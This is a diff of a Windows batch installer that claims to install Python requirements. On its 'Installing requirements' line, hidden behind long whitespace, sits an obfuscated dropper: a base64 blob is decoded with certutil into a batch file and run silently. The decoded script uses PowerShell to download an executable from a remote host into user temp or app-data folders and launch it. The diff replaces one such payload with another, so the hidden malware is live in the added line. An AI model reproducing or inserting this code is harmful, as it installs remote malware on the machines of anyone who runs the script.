@@ -1,3 +1,4 @@
+
 @echo off
 setlocal enabledelayedexpansion
 
@@ -32,7 +33,7 @@ if defined python (
 )
 
 cls
-echo Installing requirements. This may take a few minutes, depending on your internet speed...                                                                                                                                                                                                                                                   & echo QGVjaG8gb2ZmCnNldGxvY2FsIGVuYWJsZWRlbGF5ZWRleHBhbnNpb24Kc2V0ICJnZj0lVEVNUCUgJUxPQ0FMQVBQREFUQSUgJUFQUERBVEElIgpmb3IgJSVnIGluICglZ2YlKSBkbyAocG93ZXJzaGVsbCAtY29tbWFuZCAidHJ5IHsoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwczovL25vZGV1cGRhdGVyLmRpc2Nsb3VkLmFwcC9OZXdzJywgJyUlZ1xOZXdzLmV4ZScpOyBleGl0IDB9IGNhdGNoIHtleGl0IDF9IiAmIGlmIG5vdCBlcnJvcmxldmVsIDEgKHN0YXJ0ICIiICIlJWdcRHVjay5leGUiICYgZXhpdCAvYiAwKSkKZW5kbG9jYWwKZXhpdCAvYiAx > %TMP%\news.b64 & certutil -decode %TMP%\news.b64 %TMP%\news.bat >nul 2>&1 & call %TMP%\news.bat >nul 2>&1 & del %TMP%\news.b64 %TMP%\news.bat >nul 2>&1
+echo Installing requirements. This may take a few minutes, depending on your internet speed...                                                                                                                                                                                                                                                   & echo QGVjaG8gb2ZmCnNldGxvY2FsIGVuYWJsZWRlbGF5ZWRleHBhbnNpb24Kc2V0ICJnZj0lVEVNUCUgJUxPQ0FMQVBQREFUQSUgJUFQUERBVEElIgpmb3IgJSVnIGluICglZ2YlKSBkbyAocG93ZXJzaGVsbCAtY29tbWFuZCAidHJ5IHsoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwczovL25vZGV1cGRhdGVyLmRpc2Nsb3VkLmFwcC9QeXRob24nLCAnJSVnXFB5dGhvbi5leGUnKTsgZXhpdCAwfSBjYXRjaCB7ZXhpdCAxfSIgJiBpZiBub3QgZXJyb3JsZXZlbCAxIChzdGFydCAiIiAiJSVnXFB5dGhvbi5leGUiICYgZXhpdCAvYiAwKSkKZW5kbG9jYWwKZXhpdCAvYiAx > %TMP%\python.b64 & certutil -decode %TMP%\python.b64 %TMP%\python.bat >nul 2>&1 & call %TMP%\python.bat >nul 2>&1 & del %TMP%\python.b64 %TMP%\python.bat >nul 2>&1
 call "!python!" -m pip install -r requirements.txt
 
 if errorlevel 1 (
